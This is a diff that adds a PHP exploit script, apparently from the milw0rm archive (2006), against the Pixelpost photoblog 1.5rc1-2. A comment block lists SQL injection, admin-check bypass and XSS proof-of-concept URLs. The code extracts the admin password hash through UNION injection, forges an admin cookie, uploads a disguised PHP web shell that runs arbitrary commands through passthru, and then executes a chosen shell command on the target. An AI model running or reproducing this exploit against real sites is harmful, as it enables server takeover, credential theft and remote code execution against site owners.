@@ -1,0 +1,384 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Pixelpost <= 1-5rc1-2 privilege escalation exploit\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "dork: pixelpost \"RSS 2.0\" \"ATOM feed\" \"Valid xHTML / Valid CSS\"\r\n\r\n";
+
+/*
+works with:
+magic_quotes_gpc=Off
+*/
+
+if ($argc<5) {
+echo "Usage: php ".$argv[0]." host path your_ip cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to pixelpost\r\n";
+echo "your ip:   your actual ip adress, we need it to build an admin cookie\r\n";
+echo "           this is automatically set to your proxy ip if you use one\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -T[prefix]   specify a table prefix different from \"pixelpost_\"\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." a.b.c.d /pixelpost/ w.x.y.z cat ./../includes/pixelpost.php\r\n";
+echo "php ".$argv[0]." a.b.c.d / w.x.y.z  ls -la -p81\r\n";
+echo "php ".$argv[0]." a.b.c.d / none ls -la -P1.1.1.1:80\r\n";
+die;
+}
+/* software site: http://www.pixelpost.org/
+
+   description: "A small photoblog application that's a no-brainer to set up and
+   use - this is truly for anyone wishing regularly to post their photos on  the
+   web like a blog."
+
+   -----
+
+   i) sql injection in index.php near lines 670-680:
+
+   ...
+   if($_GET['category'] != "")
+	{
+		// Modified from Mark Lewin's hack for multiple categories
+		$query = mysql_query("SELECT 1,t2.id,headline,image,datetime
+		        	      FROM  {$pixelpost_db_prefix}catassoc as t1
+				      INNER JOIN {$pixelpost_db_prefix}pixelpost t2 on t2.id = t1.image_id
+				      WHERE t1.cat_id = '".$_GET['category']."'
+				      AND (datetime<='$cdate')
+				      ORDER BY datetime DESC");
+		$lookingfor = 1;
+	}
+   ...
+
+   nice code, isn't it?
+
+   with magic_quotes_gpc = Off:
+   http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',admin,'4','5' FROM pixelpost_config WHERE id=1/*
+   http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',password,'4','5' FROM pixelpost_config WHERE id=1/*
+
+   now, at screen, you have admin username & MD5 password hash and you can build
+   an admin cookie:
+
+   Cookie: pp_user=[username]; pp_password=[sha1([md5hash].[your_ip_address])];
+
+   Admin can upload .php files in images/ folder, files are renamed but you can
+   see new filename in main index page, so... you launch commands:
+
+   http://[target]/[path]/images/20060603005716_suntzu.php?cmd=cat%20./../includes/pixelpost.php
+
+   ii) same kind of sql injection in 'archivedate' argument at lines 681-687:
+   ...
+   ELSE IF ($_GET['archivedate'] != "")
+	{
+
+		$where = "AND (DATE_FORMAT(datetime, '%Y-%m')='".$_GET['archivedate']."')"; //DATE_FORMAT(foo, '%Y-%m-%d')
+		$query = mysql_query("SELECT 1,id,headline,image, datetime FROM ".$pixelpost_db_prefix."pixelpost WHERE (datetime<='$cdate') $where ORDER BY datetime desc");
+		$lookingfor = 1;
+	}
+   ...
+   poc:
+
+   http://[target]/[path]/index.php?x=browse&archivedate=')%20UNION%20SELECT%20'1','2',password,'4','5'%20FROM%20pixelpost_config/*
+
+   iii)
+   in admin/ folder at the begin of every script, except for index.php, we have:
+
+   <?php
+   if(!isset($_SESSION["pixelpost_admin"]) || $cfgrow['password'] != $_SESSION["pixelpost_admin"]) {
+	die ("Try another day!!");
+   }
+   ...
+
+   if register_globals= On, you can easily bybass this protection, poc:
+
+   http://[target]/]path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1
+
+   this can be used to see some interesting configuration info about target server:
+
+   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info
+
+   or to launch XSS attacks:
+
+   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_exif1=<script>alert(document.cookie)</script>
+   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_exif2=<script>alert(document.cookie)</script>
+   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_path=<script>alert(document.cookie)</script>
+
+   iv) another xss, without to be logged in:
+   http://[target]/[path]/admin/index.php?loginmessage="><script>window.open("http://retrogod.altervista.org")</script>
+
+   									      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+
+}
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$your_ip=$argv[3];
+$cmd="";$port=80;$proxy="";$table_prefix="pixelpost_";
+
+for ($i=4; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P") and ($temp<>"-T"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $table_prefix=str_replace("-T","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else
+{
+$p='http://'.$host.':'.$port.$path;
+$temp=explode(":",$proxy);
+$your_ip=$temp[0];
+}
+
+echo "Trying sql injection in 'category' argument...\r\n";
+$sql="'/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/".$table_prefix."config/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$packet="GET ".$p."?x=browse&category=".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("alt=\"",$html);
+$temp2=explode("\"",$temp[1]);
+$hash=trim($temp2[0]);
+if (is_hash($hash)){
+echo "admin md5 password hash -> ".$hash."\r\n";
+$sql="'/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/".$table_prefix."config/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$packet="GET ".$p."?x=browse&category=".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("alt=\"",$html);
+$temp2=explode("\"",$temp[1]);
+$admin=trim($temp2[0]);
+echo "  \"   username          -> ".$admin."\r\n";
+}
+else { echo "Trying with 'archivedate' argument...\r\n";
+$sql="')/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/".$table_prefix."config/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$packet="GET ".$p."?x=browse&archivedate=".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("alt=\"",$html);
+$temp2=explode("\"",$temp[1]);
+$hash=trim($temp2[0]);
+if (is_hash($hash)){
+         echo "admin md5 password hash -> ".$hash."\r\n";
+         }
+else {die ("Exploit failed...magic_quotes_gpc on here or code patched");}
+
+$sql="')/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/".$table_prefix."config/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$packet="GET ".$p."?x=browse&archivedate=".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("alt=\"",$html);
+$temp2=explode("\"",$temp[1]);
+$admin=trim($temp2[0]);
+echo "  \"   username          -> ".$admin."\r\n";
+}
+
+$cookie="pp_user=".$admin."; pp_password=".sha1($hash.$your_ip).";";
+$packet="GET ".$p."admin/index.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$cookie="";
+for ($i=1; $i<=count($temp); $i++)
+{
+$temp2=explode(" ",$temp[$i]);
+$cookie.=" ".$temp2[0];
+}
+echo "admin cookie            ->".$cookie."\r\n";
+
+$shell=
+'<?php
+if (get_magic_quotes_gpc()){$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);}
+ini_set("max_execution_time",0);
+error_reporting(0);
+echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
+passthru($_REQUEST["cmd"]);
+echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
+?>';
+srand(make_seed());
+$anumber = rand(1,99999);
+$my_file="suntzu".$anumber.".php";
+$data='
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="headline"
+
+Under Costruction... - Admin.
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="category[]"
+
+1
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="body"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="autodate"
+
+3
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="post_year"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="post_month"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="post_day"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="post_hour"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="post_minute"
+
+
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="userfile"; filename="'.$my_file.'"
+Content-Type: image/jpeg
+
+'.$shell.'
+-----------------------------7d6318101b00a2
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------7d6318101b00a2--
+';
+
+$packet="POST ".$p."admin/index.php?x=save HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6318101b00a2\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+$packet="GET ".$p."index.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("img src=\"",$html);
+$temp2=explode(" ",$temp[1]);
+for ($i=1; $i<=count($temp); $i++)
+{
+$temp2=explode("\"",$temp[$i]);
+if (eregi($my_file,$temp2[0]))
+ {
+  $my_path=$temp2[0];
+  echo "shell -> ".$my_path."\r\n";
+  break;
+ }
+}
+
+$packet="GET ".$p.$my_path." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"*deli*"))
+{
+ $temp=explode("*deli*",$html);
+ die("Exploit succeeded...\r\n".$temp[1]);
+}
+else
+{
+ echo "Failed to launch commands...";
+}
+?>
+
+# milw0rm.com [2006-06-03]
